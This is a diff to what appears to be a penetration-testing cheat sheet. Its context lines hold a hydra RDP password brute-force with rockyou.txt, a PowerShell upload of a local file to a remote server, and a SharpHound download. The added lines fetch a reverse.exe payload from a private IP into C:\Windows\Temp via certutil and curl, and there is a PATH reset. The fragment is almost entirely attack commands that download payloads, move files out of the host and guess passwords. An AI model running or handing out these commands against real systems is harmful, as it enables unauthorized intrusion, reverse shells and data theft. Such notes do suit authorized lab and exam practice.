@@ -3108,6 +3108,8 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 	
  	Invoke-WebRequest -Uri "https://remote-server-address/path/on/remote/server/upload_endpoint" -Method PUT -InFile "C:\path\to\local\file"
  	iwr -uri http://192.168.119.5:80/SharpHound.ps1 -Outfile SharpHound.ps1
+ 	certutil -urlcache -split -f http://192.168.45.195:80/reverse.exe C:\Windows\Temp\reverse.exe
+	curl -o C:\Windows\Temp\reverse2.exe http://192.168.45.195:80/reverse.exe
 
 # LibreOffice Macros
 
@@ -3216,5 +3218,7 @@ run
         cd exploit_dir
 	pip install -r requirements.txt
   	deactivate
-  
+
+  # Fixing Path In Windows
+  	set PATH=%SystemRoot%\system32;%SystemRoot%;
        
